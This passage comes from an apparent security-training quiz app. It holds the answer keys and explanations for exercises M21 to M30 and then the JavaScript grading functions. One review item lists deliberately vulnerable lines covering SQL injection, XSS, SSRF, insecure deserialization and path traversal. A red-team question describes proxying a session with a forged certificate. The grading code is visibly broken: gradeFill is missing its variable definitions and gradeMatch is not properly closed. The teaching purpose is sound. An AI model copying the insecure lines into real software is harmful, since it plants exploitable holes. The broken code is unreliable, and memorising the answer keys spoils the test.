list.","why":"Per-source rate limiting stops a single host from consuming the connection table while leaving normal users alone. A demilitarised zone is the segmented network where public services live, and it exists so that a breach of a public server does not become a path to the internal database. An allow list, also called a whitelist, states exactly which addresses may reach management interfaces, which is far safer than a deny list that must predict every attacker. A flat network would let a public server talk to everything, which is what turns one DDoS or one breach into a full outage, and an end user licence agreement is a software licence term, not a network control.","kw":["distributed denial of service (DDoS)","rate limit","demilitarised zone (DMZ)","denial of service","amplification attack"]},{"id":"M22","type":"order","theme":"Compliance and operations","points":5,"scenario":"A Meridian Retail workstation is confirmed infected with malware that has been beaconing to the command and control server for three days. The incident manager asks you to publish the response sequence for the case file.","question":"Put the response steps in the correct order, from the first action to the last.","items":["Isolate the host from the network while leaving the power on","Capture the memory and the volatile evidence, then image the disk","Remove the persistence mechanism and the malicious files from the image copy","Rebuild the host from the approved image and restore the user's data from a clean backup","Check the command and control addresses on other hosts and block them at the proxy","Hold a lessons-learned review and update the detection rules"],"hint":"Contain before you collect, collect before you clean, and clean before you rebuild.","why":"Isolation first stops the beacon and any lateral movement. Capture the memory before any reboot, because running processes, network connections and encryption keys disappear when power is cut, and the disk image documents what was on the host. Cleaning the persistence and the files comes next, using the image rather than the live system. Rebuilding from a known good image and restoring only clean data guarantees there is nothing hidden left behind, which is why full rebuilds are preferred for a rootkit or a backdoor. Hunting the command and control addresses across the estate stops the attacker's other footholds, and the lessons-learned review plus rule updates is what stops the same case recurring. The order matters because each step depends on the evidence that the previous step preserved. The attacker reached three days of command and control because the original access used a privilege escalation that the team never spotted, so the case file records both the indicators of compromise and the missing detection that allowed the lateral movement.","kw":["command and control (C2)","persistence","indicators of compromise (IoC)","malware signature","privilege escalation","lateral movement"]},{"id":"M23","type":"order","theme":"Malware types and behaviours","points":5,"scenario":"The Meridian Retail SOC has four open alerts on the board at 08:00 and one analyst on shift. The team lead asks you to rank them by how soon a person must act, with the most urgent first.","question":"Drag the alerts into the order in which they must be handled, most urgent first.","items":["A forged Kerberos ticket on a domain controller that never expires","A steady beacon from one workstation to a new domain","A blocked macro in a document a user opened","A missing patch on an internal print server"],"hint":"Ask what the attacker can already do, not how loud the alert is. A domain-wide credential is worse than one host.","why":"A forged, non-expiring Kerberos ticket on a domain controller means the attacker can act as any user in the domain, which outranks everything else. A steady beacon to a new domain means an established command and control channel on one host, which must be contained before lateral movement starts. A macro that was blocked did no harm yet, but it shows an active phishing campaign, so it is handled after the live compromises. A missing patch on an internal print server is real technical debt, but it is a planned change, not an incident. This is the judgement the SOC asks for: attacker capability first, exposure second, hygiene last, and it is why a CVSS score from a routine vulnerability scan never sets the queue order on its own.","kw":["Kerberos golden ticket","beacon","command and control (C2)","privilege escalation","CVSS score","vulnerability scan","lateral movement"]},{"id":"M24","type":"fill","theme":"Application attacks and vulnerabilities","points":5,"scenario":"A Meridian Retail warehouse application crashes when a barcode field receives 4,000 characters. You are writing the defect note for the developer. Complete the note with the correct terms.","question":"Choose the correct term for each gap in the defect note.","parts":["The scan string is copied into a fixed 256-byte stack buffer with no length check, which is a ",{"b":0},". ","The bytes that overflow the buffer overwrite the saved return address, which is why the defect can lead to ",{"b":1},". ","The fix is to bound the copy to the size of the buffer and to use a ",{"b":2}," instead of the unbounded string copy function. "],"answers":["buffer overflow","code execution","safe string function"],"extras":["a directory traversal","an insecure deserialization","a honeyfile"],"hint":"The input is longer than the space reserved for it, the saved return address is overwritten, and the fix is a copy that knows the buffer size.","why":"A buffer overflow happens when more data is written than the destination can hold, and on the stack the excess can overwrite the return address, which is how a crash becomes code execution. The bounded copy function takes the destination size as an argument, so the write stops at the limit, and a compiler stack canary adds a second check. Directory traversal and insecure deserialization are different classes: the first abuses file paths, the second trusts serialised objects. The long-term answer is a language or library that manages memory for you, and fuzzing the input field so the next length limit is found before a user finds it. A race condition would need two threads competing for the same buffer, which is not what a single long scan string does.","kw":["buffer overflow","input validation","race condition (TOCTOU)","insecure deserialization","directory traversal"]},{"id":"M25","type":"spot","theme":"Application attacks and vulnerabilities","points":5,"scenario":"Meridian Retail is preparing a new payment page for a security review. A junior developer drafted eight lines and the reviewer has to reject anything that would pass an attacker a way in.","question":"Flag every line in the artefact that contains a security fault.","art":{"kind":"code","pick":true,"title":"Payment page draft, review copy","lines":["const tax = subtotal * 0.20;","const rows = await db.query(`SELECT * FROM payments WHERE ref = '${ref}'`);","const session = await db.query('SELECT * FROM sessions WHERE id = ?', [sid]);","res.send(`<h1>Hello ${req.query.name}</h1>`);","await fetch(req.body.callbackUrl, { method: 'POST' });","const note = JSON.parse(req.cookies.prefs).note;","const raw = fs.readFileSync('/srv/invoices/' + req.query.invoice);","const ttl = 900;"]},"bad":[1,3,4,5,6],"whyEach":["A percentage calculation on the subtotal is ordinary business logic with no security fault.","A template literal builds the query with the user's ref value, which is SQL injection through string concatenation.","A parameterised query with a bound ? placeholder is the correct pattern, so this line is fine.","Interpolating a query parameter straight into HTML is reflected cross-site scripting, because output encoding is missing.","Fetching a URL that the request body supplies lets the server be pointed at internal addresses, which is server-side request forgery.","Parsing a cookie value with JSON.parse and trusting it is insecure deserialization of client-controlled data.","Joining a query parameter onto a server path lets an attacker walk out of the folder with ../, which is directory traversal.","A fifteen-minute session lifetime in seconds is a normal configuration value, not a fault."],"hint":"Five lines handle user input in an unsafe way, and one line shows the safe version of the same pattern.","why":"The whole point of a code review is to spot the difference between the line that uses a bound parameter and the line that glues strings together. Line two and line three do the same job, but only line three is safe, and that contrast is the fastest way to teach parameterisation. Lines four, five, six and seven each take something the client controls and use it in a dangerous place: the page body, the server's request engine, the parser, and the file path. The fixes are output encoding, an allow list of permitted outbound hosts, a signed and validated cookie format, and path normalisation against a fixed base folder. A single missing check like any of these is what an attacker needs.","kw":["SQL injection (SQLi)","cross-site scripting (XSS)","server-side request forgery (SSRF)","insecure deserialization","directory traversal","parameterised query","output encoding","input validation","OWASP Top 10"]},{"id":"M26","type":"terminal","theme":"Network attacks","points":5,"scenario":"Meridian Retail migrated a payment scheduler to Linux last month. Before the change window closes, the auditor wants proof that the rsyslog package is installed on the new scheduler host and which version is present, because a vulnerable version is being replaced. You are logged in locally on that host over SSH, and the package tool on this distribution is dnf.","question":"Type the command that shows whether the rsyslog package is installed on this host and prints the exact version string.","sample":"Last metadata expiration check: 0:12:41 ago on Tue 11 Mar 2025 09:02:11.\nInstalled Packages\nName         : rsyslog\nVersion      : 8.2310.0\nRelease      : 4.el9\nArchitecture : x86_64\nSize         : 2.1 M\nSource       : rsyslog-8.2310.0-4.el9.src.rpm\nRepository   : @System","parts":[{"label":"uses the dnf package tool","re":"\\bdnf\\b"},{"label":"asks for information about the package","re":"\\b(info|list)\\b"},{"label":"names the rsyslog package","re":"\\brsyslog\\b"}],"solution":"dnf info rsyslog","hint":"The package manager can describe a single installed package. dnf has a sub-command that prints name, version and release for one package.","why":"On a Red Hat family distribution, dnf info rsyslog prints the installed version, release and repository for that one package, which is exactly the evidence an auditor or a change record needs. dnf list installed would print the same version in a shorter table. The reason this matters is that a vulnerability scanner reports a package name and a version, and you cannot decide whether the host is affected until you confirm both on the host itself. The same idea applies with other tools, such as dpkg -l on a Debian family host or rpm -q, and you record the output with the host name and the date. That evidence is what turns a vulnerability scan finding, with its CVSS score, into a decision: patch now, apply virtual patching at the edge, or accept the risk while a zero-day fix is prepared.","kw":["vulnerability scan","CVSS score","virtual patching","zero-day"]},{"id":"M27","type":"match","theme":"Tools and tradecraft","points":5,"scenario":"Three graduates joined the Meridian Retail security team this month. You are writing the one-page tool guide that explains what each tool in the team's kit is actually for.","question":"Match each tool to the job it is normally used for.","pairs":[["Nmap","Enumerate hosts, open ports and service versions"],["Wireshark","Capture and filter packets to read a conversation"],["Metasploit","Run and manage exploits against a test target"],["Mimikatz","Read credentials and tickets from Windows memory"],["Hydra","Try password guesses against a login service"],["John the Ripper","Crack password hashes offline from a stolen file"]],"hint":"Separate the tools that touch the network from the tools that work on a host, and the online guessing from the offline cracking.","why":"Nmap maps hosts and services, so it is used in discovery and in vulnerability management to know what is exposed. Wireshark reads packets, which is how you prove an on-path attack or a data transfer. Metasploit packages exploits and is used during authorised tests, so the same tool appears in both attack and defence chapters. Mimikatz reads credentials and Kerberos tickets from Windows memory, which is how pass the hash and golden ticket attacks are carried out and how they are investigated. Hydra guesses passwords against a live service, while John the Ripper works offline on a hash file. Knowing which tool touches the network and which works on a local artefact tells you what evidence each one leaves.","kw":["Nmap","Wireshark","Metasploit","Mimikatz","Hydra","John the Ripper","pass the hash","Kerberos golden ticket","vulnerability scan"]},{"id":"M28","type":"spot","theme":"Malware types and behaviours","points":5,"scenario":"The Meridian Retail mail gateway writes one decision line per message. A phishing wave arrived overnight, and the mail team needs to know how far into the business it actually reached before it starts telling users what to do.","question":"Flag every line in the artefact that shows a malicious message or payload reaching a mailbox.","art":{"kind":"log","pick":true,"title":"Mail gateway decisions, 02:00 to 03:00","lines":["02:04:11 relay01 postfix/smtpd[2214]: connect from unknown[203[.]0[.]113[.]9]","02:04:12 relay01 amavis[2215]: BLOCKED SPF fail and DMARC fail for sender invoice@meridian-retail.example","02:04:13 relay01 amavis[2215]: DELIVERED to <a.rivera@meridian-retail.example> subject 'Invoice overdue' attach 'Invoice_9941.docm'","02:05:02 relay01 amavis[2216]: QUARANTINED banned extension .scr from sender billing@post-secure.example","02:06:44 relay01 amavis[2217]: DELIVERED to <k.osei@meridian-retail.example> link hxxp://portal-meridian[.]example/login","02:07:10 relay01 amavis[2218]: REJECTED relay denied for domain secure-mail[.]example","02:09:31 relay01 amavis[2219]: DELIVERED to <s.ahmed@meridian-retail.example> attach 'Remittance_advice.zip' password in body","02:11:02 relay01 amavis[2220]: BLOCKED malware signature Trojan.GenericKD.71234 in attach 'scan.pdf.exe'"]},"bad":[2,4,6],"whyEach":["A connection from an unknown host is normal traffic until a decision follows it, so this line alone is not a delivery.","An SPF and DMARC failure blocked the message, so nothing reached a mailbox.","A macro-enabled document was delivered to a real mailbox, which is the start of a malware case.","The gateway quarantined the banned screen-saver extension, so the user never saw it.","A credential-phishing link was delivered to a real mailbox, so the user can still click it.","The relay refused the message because the domain was denied, so nothing was delivered.","A password-protected archive was delivered, which hides the payload from static gateway scanning and makes the case urgent.","A known malware signature was blocked at the gateway, so the attachment never arrived."],"hint":"Look for the decision word on each line, then ask whether a real mailbox address appears with a delivered payload.","why":"Gateway logs record a decision per line, and the decision word is the whole story. DELIVERED means a user can act on it, so those lines start the incident, especially when the attachment is a macro document or a password-protected archive that hides its content from scanners. BLOCKED, QUARANTINED and REJECTED mean the control worked, and they are useful as evidence that the control is tuned. A connection line is context only. With three delivered messages you then hunt the mailboxes: search for the subjects and hashes, check whether the macro ran, and treat the password-protected archive as the highest risk because no gateway can read inside it. The three delivered messages are where the indicators of compromise come from, and if a user opened the macro document the case becomes a spyware investigation rather than a mail filtering exercise. The collection step comes later, when the attacker gathers the files worth taking.","kw":["malware signature","spyware","trojan","indicators of compromise (IoC)","fileless malware","collection"]},{"id":"M29","type":"dual","theme":"Cryptographic attacks","points":5,"scenario":"A Meridian Retail partner portal uses a self-signed certificate on port 8443. Users click through the browser warning every morning. Two students on your team have been asked to write up the same situation from opposite sides.","question":"Answer both questions. The blue team question asks what you detect and prevent, the red team question asks what you would do next as the attacker.","q1":{"q":"Blue team: which control most directly removes the ability of an on-path attacker to sit in this TLS session without being noticed?","opts":["Replace the self-signed certificate with one from a trusted CA and enable certificate pinning","Increase the RSA key length on the self-signed certificate to 8192 bits","Move the portal from port 8443 to port 443","Add a second self-signed certificate as a backup","Enable HTTP Strict Transport Security on the marketing site"],"correct":[0]},"q2":{"q":"Red team: given that users are trained to click through certificate warnings, what is the most direct next step for an on-path attacker on the same network?","opts":["Present a forged certificate for the portal and proxy the session while users click through the warning","Run a brute force key search against the 2048-bit server key","Wait for a birthday collision between two TLS certificates","Ask the certificate authority to reissue the portal certificate","Crack the session key with a chosen plaintext attack on the login form"],"correct":[0]},"hint":"The warning is the vulnerability. Removing the warning trains the user; keeping the warning trains the attacker.","why":"A self-signed certificate produces a browser warning that users learn to ignore, and that habit is what an on-path attacker needs: a forged certificate for the same name is accepted because clicking through has become normal. The blue team fix is a certificate from a trusted CA, which removes the warning, plus certificate pinning so a certificate issued by any other authority is rejected by the application. Key length, the port number and a backup self-signed certificate do not change the trust problem at all. On the red team side, brute forcing a 2048-bit key or waiting for a hash collision is not realistic; the practical path is the human habit, which is why user awareness and pinning are both part of the answer.","kw":["man-in-the-middle key exchange","on-path (man-in-the-middle) attack","certificate spoofing","certificate pinning","brute force key search","birthday attack","chosen plaintext attack","dictionary attack"]},{"id":"M30","type":"branch","theme":"Application attacks and vulnerabilities","points":5,"scenario":"At 11:20 a Meridian Retail developer reports that the supplier portal is behaving strangely. A file on the web server has a creation date of 03:14 and a name that no build pipeline produces. The application log shows a POST to /upload with a form field named file, followed by requests to /img/logo.php with a cmd parameter. The portal runs on a shared web host.","question":"Work through the incident step by step. The second step appears only after you make the first decision.","steps":[{"sit":"An unexpected file is on the web server, and requests to it carry a cmd parameter. What is your first action?","opts":["Take the portal offline and preserve the file and logs, then hunt for how the upload was allowed","Delete the file, restart the web service and close the ticket","Run a full vulnerability scan of the host and wait for the report","Change all database passwords and continue monitoring"],"correct":0,"res":["Correct. The file is a web shell, so preserve it as evidence before anything changes, then find the upload path that allowed it, because the same hole will be used again.","Deleting the only copy of the attacker's tool destroys your evidence, and the upload weakness stays open, so the shell returns within days.","A scan takes hours and finds missing patches, not the upload weakness in the application code. The attacker is active now.","Credential changes do not remove a web shell on disk, and monitoring does not close the upload path."]},{"sit":"The web shell is preserved and the portal is off the internet. The upload form accepts any file type from any logged-in supplier. What is the correct fix?","opts":["Store uploads outside the web root, allow only an approved file type list, and validate the content not just the extension","Rename the upload folder so nobody can guess the path","Add a rule that blocks the cmd string in the request body","Ask suppliers to upload only safe files in future"],"correct":0,"res":["Correct. Removing the executable location and allow-listing the type, with a content check that cannot be fooled by a double extension, closes the upload path that created the web shell.","A renamed folder is still reachable, and the attacker can read the new name from the page source.","Blocking one parameter name is trivial to bypass, and the file itself is already on disk.","A policy with no technical control leaves the same hole open for the next supplier."]}],"hint":"First keep the attacker's file as evidence, then close the door that let it in: where the file is stored and what type is accepted.","why":"A web shell is a small script that gives the attacker a command channel through the web server, and the cmd parameter in the log is its control interface. Responders preserve it because it carries the attacker's commands and often the addresses they used. The underlying weakness is almost always an upload feature that trusts the client: it accepts any file, keeps the file inside the web root, or checks only the extension, which a double extension such as logo.php.jpg defeats. The durable fix is to store uploads outside the web root, serve them through a handler that sets the content type, allow only the file types the business needs, and check the real content of the file rather than its name. That removes the directory traversal path the attacker used to place the file, and it also removes the persistence, because a script that cannot be reached cannot be run again. The impact of leaving it in place is a command channel inside the company network, which is why this class of finding is never closed as low risk.","kw":["web shell","directory traversal","input validation","OWASP Top 10","persistence","command injection","impact"]}];

  /* ---------------- syntax highlighting for logs ---------------- */

  /* ---------------- grading (with optional DOM marking) ---------------- */
  function tagNode(el, st) {
    if (!el) { return; }
    el.classList.add(st === "miss" ? "miss" : st);
    var v = document.createElement("span");
    v.className = "verdict " + (st === "miss" ? "miss" : st);
    v.textContent = st === "ok" ? "correct" : (st === "bad" ? "wrong" : "missed correct");
    el.appendChild(v);
  }
  function noteOf(ex, key) { return (ex.whyEach && ex.whyEach[key]) ? ex.whyEach[key] : ""; }

  function gradeMcq(ex, a, root) {
    var sel = (a && a.sel) ? a.sel : [];
    var correct = ex.correct;
    var hit = correct.filter(function (i) { return sel.indexOf(i) >= 0; }).length;
    var earned = ex.points * hit / correct.length;
    var notes = [], stText = [], cText = [];
    disp(ex).forEach(function (oi) {
      var node = root ? root.querySelector('.opt[data-i="' + oi + '"]') : null;
      var isC = correct.indexOf(oi) >= 0, isS = sel.indexOf(oi) >= 0, st = "";
      if (isS && isC) { st = "ok"; } else if (isS && !isC) { st = "bad"; } else if (isC) { st = "miss"; }
      if (st) { tagNode(node, st); notes.push((st === "ok" ? "Correct: " : (st === "bad" ? "Wrong: " : "Missed: ")) + noteOf(ex, oi)); }
      if (isS) { stText.push(ex.opts[oi]); }
      if (isC) { cText.push(ex.opts[oi]); }
    });
    return {
      earned: earned, max: ex.points, notes: notes,
      student: stText.length ? stText.join(" | ") : "(nothing selected)",
      correct: cText.join(" | "),
      hit: hit, total: correct.length
    };
  }

  function gradeClassify(ex, a, root) {
    var place = (a && a.place) || {};
    var hit = 0, notes = [], stText = [], cText = [];
    ex.items.forEach(function (t, i) {
      var want = ex.answer[i], got = place[i];
      var node = root ? root.querySelector('.chip[data-i="' + i + '"]') : null;
      var st = "";
      if (got === want) { st = "ok"; hit++; } else if (got !== undefined) { st = "bad"; } else { st = "miss"; }
      tagNode(node, st);
      var line = t + " -> " + (got === undefined ? "not placed" : ex.buckets[got]) + " (correct: " + ex.buckets[want] + "). " + noteOf(ex, i);
      notes.push((st === "ok" ? "Correct: " : (st === "bad" ? "Wrong: " : "Missed: ")) + line);
      stText.push(t + " -> " + (got === undefined ? "not placed" : ex.buckets[got]));
      cText.push(t + " -> " + ex.buckets[want]);
    });
    return { earned: ex.points * hit / ex.items.length, max: ex.points, notes: notes, student: stText.join(" ; "), correct: cText.join(" ; "), hit: hit, total: ex.items.length };
  }

  function gradeOrder(ex, a, root) {
    var ord = (a && a.ord) ? a.ord : disp(ex);
    var hit = 0, notes = [], stText = [], cText = [];
    for (var p = 0; p < ex.items.length; p++) {
      var ii = ord[p], ok = ii === p;
      if (ok) { hit++; }
      var node = root ? root.querySelector('.orderrow[data-pos="' + p + '"]') : null;
      tagNode(node, ok ? "ok" : "bad");
      notes.push((ok ? "Correct position: " : "Wrong position: ") + ex.items[ii] + (ok ? "" : " (correct position " + (ii + 1) + ")"));
      stText.push((p + 1) + ". " + ex.items[ii]);
      cText.push((p + 1) + ". " + ex.items[p]);
    }
    return { earned: ex.points * hit / ex.items.length, max: ex.points, notes: notes, student: stText.join(" | "), correct: cText.join(" | "), hit: hit, total: ex.items.length };
  }

  function gradeMatch(ex, a, root) {
    var sel = (a && a.sel) || [], hit = 0, notes = [], stText = [], cText = [];
    ex.pairs.forEach(function (p, li) {
      var got = sel[li], ok = got === li;
      if (ok) { hit++; }
      var node = root ? root.querySelector('.matchrow[data-l="' + li + '"]') : null;
      tagNode(node, ok ? "ok" : "bad");
      var gotTxt = (got === undefined || got === "") ? "no choice" : ex.pairs[got][1];
      notes.push((ok ? "Correct pair: " : "Wrong pair: ") + p[0] + " -> " + gotTxt + (ok ? "" : " (correct: " + p[1] + ")"));
      stText.push(p[0] + " -> " + gotTxt);
      cText.push(p[0] + " -> " + p[1]);

    return { earned: ex.points * hit / ex.pairs.length, max: ex.points, notes: notes, student: stText.join(" ; "), correct: cText.join(" ; "), hit: hit, total: ex.pairs.length };
  }

  function gradeFill(ex, a, root) {
    var sel = (a && a.sel) || [], bank = bankFor(ex), hit = 0, notes = [], stText = [], cText = [];
    ex.answers.forEach(function (want, bi) {

      if (ok) { hit++; }

      if (node) {

        sp.className = "verdict " + (ok ? "ok" : "bad");
        sp.textContent = ok ? "correct" : "wrong";
        node.parentNode.insertBefore(sp, node.nextSibling);
      }
      notes.push((ok ? "Correct gap: " : "Wrong gap: ") + gotTxt + (ok ? "" : " (correct: " + want + ")"));
      stText.push(gotTxt);
      cText.push(want);
    });
    return { earned: ex.points * hit / ex.answers.length, max: ex.points, notes: notes, student: stText.join(" | "), correct: cText.join(" | "), hit: hit, total: ex.answers.length };
  }

  /* A terminal part may carry its pattern as a string (the form that survives
     JSON inside the built page) or as a RegExp object (the form used while the
     data file is still plain JavaScript). Both have to work, and a pattern that
     was lost during serialisation must never throw and break the Check button. */
  var NEVER = /$^/;
  function rxOf(re) {
    if (re instanceof RegExp) { return re; }
    if (typeof re === "string" && re.length) {
      try { return new RegExp(re); } catch (e) { return NEVER; }
    }
    if (re && typeof re.source === "string" && re.source.length) {
      try { return new RegExp(re.source, re.flags || ""); } catch (e) { return NEVER; }
    }
    return NEVER;
  }

  function gradeTerminal(ex, a) {
    var cmd = (a && a.cmd) ? String(a.cmd) : "";
    /* Marking is forgiving about spacing: the command as typed and the same
       command with runs of spaces collapsed are both tested. */
    var variants = [cmd, cmd.replace(/\s+/g, " ").trim()];
    var hit = 0, notes = [];
    ex.parts.forEach(function (p) {
      var rx = rxOf(p.re);
      var ok = cmd ? variants.some(function (v) { return v.length > 0 && rx.test(v); }) : false;
      if (ok) { hit++; }
      notes.push((ok ? "Present: " : "Missing: ") + p.label);
    });
    return { earned: ex.points * hit / ex.parts.length, max: ex.points, notes: notes, student: cmd || "(no command typed)", correct: ex.solution, hit: hit, total: ex.parts.length };
  }

  function gradeBranch(ex, a, root) {
    var picks = (a && a.picks) || [], hit = 0, notes = [], stText = [], cText = [];
    ex.steps.forEach(function (st, i) {
      var got = picks[i], ok = got === st.correct;
      if (ok) { hit++; }
      var node = root ? root.querySelector('.step[data-s="' + i + '"]') : null;
      tagNode(node, ok ? "ok" : "bad");
      var gotTxt = (got === undefined) ? "no choice" : st.opts[got];
      notes.push((ok ? "Step " + (i + 1) + " correct. " : "Step " + (i + 1) + " wrong. ") + "You chose: " + gotTxt + (ok ? "" : " (best: " + st.opts[st.correct] + ")"));
      stText.push("Step " + (i + 1) + ": " + gotTxt);
      cText.push("Step " + (i + 1) + ": " + st.opts[st.correct]);
    });
    return { earned: ex.points * hit / ex.steps.length, max: ex.points, notes: notes, student: stText.join(" | "), correct: cText.join(" | "), hit: hit, total: ex.steps.length };
  }

  function gradeDual(ex, a, root) {
    var hit = 0, notes = [], stText = [], cText = [];
    [["Blue team", ex.q1, a ? a.a : undefined], ["Red team", ex.q2, a ? a.b : undefined]].forEach(function (row) {
      var label = row[0], g = row[1], got = row[2];
      var ok = got !== undefined && g.correct.indexOf(got) >= 0;
      if (ok) { hit++; }
      if (root && got !== undefined) {
        var n2 = root.querySelector('[data-g="' + label + '"][data-o="' + got + '"]');
        if (n2) { tagNode(n2, ok ? "ok" : "bad"); }
      }
      var gotTxt = (got === undefined) ? "no choice" : g.opts[got];
      notes.push((ok ? label + " correct. " : label + " wrong. ") + "You chose: " + gotTxt + (ok ? "" : " (best: " + g.opts[g.correct[0]] + ")"));
      stText.push(label + ": " + gotTxt);
      cText.push(label + ": " + g.opts[g.correct[0]]);
